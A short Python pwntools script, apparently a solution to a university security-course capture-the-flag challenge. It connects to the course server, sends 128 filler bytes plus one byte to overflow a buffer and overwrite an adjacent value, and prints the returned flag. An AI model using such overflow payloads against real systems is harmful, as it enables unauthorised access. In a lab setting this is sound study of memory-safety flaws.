from pwn import remote

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23151

remote = remote(SERVER, PORT, timeout=10000)

buffer = b"a" * 128 + b"3"

remote.recvline()
remote.sendline(buffer)
flag = remote.recvline_contains(b"SSof{")
print(flag.decode().split()[-1])